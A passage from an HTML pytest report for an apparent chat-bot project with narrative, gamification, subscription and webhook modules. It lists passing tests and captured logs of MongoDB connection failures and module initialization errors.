WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35bd88ed7674ef4ee947, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35c488ed7674ef4ee948, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35cd88ed7674ef4ee949, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf35da88ed7674ef4ee94a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestCommandHandlerIntegration::test_handle_start_command_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestCommandHandlerIntegration::test_handle_start_new_user_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestCommandHandlerIntegration::test_handle_menu_command_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestCommandHandlerIntegration::test_handle_help_command_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestCommandHandlerIntegration::test_handle_unknown_command_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestCommandHandlerIntegration::test_command_handler_without_user_service</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestWebhookHandlerIntegration::test_process_update_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:271 Failed to publish update_received event: 1 validation error for UpdateReceivedEvent
update_data
  Input should be a valid dictionary [type=dict_type, input_value=&lt;Mock name=&#x27;mock.dict()&#x27; id=&#x27;137537619434512&#x27;&gt;, input_type=Mock]
    For further information visit https://errors.pydantic.dev/2.9/v/dict_type<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestWebhookHandlerIntegration::test_setup_webhook_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestWebhookHandlerIntegration::test_setup_webhook_invalid_url_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.handlers.webhook:webhook.py:75 Invalid webhook URL: Must use HTTPS protocol<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestWebhookHandlerIntegration::test_validate_request_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestWebhookHandlerIntegration::test_validate_request_invalid_method_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:105 Invalid request method: GET<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestWebhookHandlerIntegration::test_webhook_handler_without_event_bus</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestHandlerEventIntegration::test_user_interaction_event_published</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestEndToEndHandlerIntegration::test_complete_command_flow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_subscription_workflow.py::TestSubscriptionWorkflow::test_create_subscription_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_subscription_workflow.py::TestSubscriptionWorkflow::test_check_vip_status_active_subscription</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_subscription_workflow.py::TestSubscriptionWorkflow::test_check_vip_status_no_subscription</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_subscription_workflow.py::TestSubscriptionWorkflow::test_check_vip_status_expired_subscription</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_user_registration_workflow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_vip_access_validation_workflow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_narrative_choice_workflow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_subscription_update_workflow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_event_ordering_workflow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_error_handling_in_workflows</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.coordinator:coordinator.py:92 Error processing user interaction: Event bus error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_coordinator_service_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/emotional/test_complete_journey.py::test_complete_emotional_journey</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/emotional/test_cross_module_integration.py::test_emotional_event_triggers_gamification</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/integration/emotional/test_cross_module_integration.py::test_level_progression_validates_vip_status</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_send_message_success</td>
          <td class="col-duration">0.11</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:705 Failed to publish message sent event: Unsupported event type: lucien_message_sent<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_send_message_with_template_id</td>
          <td class="col-duration">0.10</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:705 Failed to publish message sent event: Unsupported event type: lucien_message_sent<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_schedule_message_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:753 Failed to publish message scheduled event: Unsupported event type: lucien_message_scheduled<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_schedule_message_without_redis</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:753 Failed to publish message scheduled event: Unsupported event type: lucien_message_scheduled<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_template_not_found_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:386 Template not found in database: nonexistent_template
ERROR    src.modules.narrative.lucien_messenger:lucien_messenger.py:390 Error resolving template nonexistent_template: Template not found: nonexistent_template<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_template_rendering</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_process_scheduled_messages</td>
          <td class="col-duration">0.11</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:705 Failed to publish message sent event: Unsupported event type: lucien_message_sent<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_create_template</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.lucien_messenger:lucien_messenger.py:774 Failed to publish template created event: Unsupported event type: lucien_template_created<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_get_user_messages</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/test_lucien_messenger.py::TestLucienMessenger::test_create_lucien_messenger_factory</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_add_besitos_invalid_amount</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_spend_besitos_invalid_amount</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_get_balance_database_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:348 Database error getting balance for user test_user_123: Database error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/gamification/test_item_manager.py::test_add_and_get_inventory</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/gamification/test_item_manager.py::test_remove_item</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/gamification/test_item_manager.py::test_set_user_item</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_get_fragment_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.fragment_manager:fragment_manager.py:517 Failed to publish fragment accessed event: Unsupported event type: narrative_fragment_accessed<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_get_fragment_not_found</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.narrative.fragment_manager:fragment_manager.py:94 Fragment not found: nonexistent_fragment<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_get_vip_fragment_without_user_id</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_update_progress_validation_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_get_user_progress_new_user</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_get_user_progress_existing_user</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/modules/narrative/test_fragment_manager.py::TestNarrativeFragmentManager::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_message_processing_throughput</td>
          <td class="col-duration">40.95</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>Throughput: 1255.13 messages/second
<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf360a88ed7674ef4ee950, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf361088ed7674ef4ee951, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf361788ed7674ef4ee952, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf362088ed7674ef4ee953, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf362d88ed7674ef4ee954, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_concurrent_message_processing</td>
          <td class="col-duration">40.24</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>Concurrent processing time: 0.08 seconds
<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf363388ed7674ef4ee955, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf363988ed7674ef4ee956, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf364088ed7674ef4ee957, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
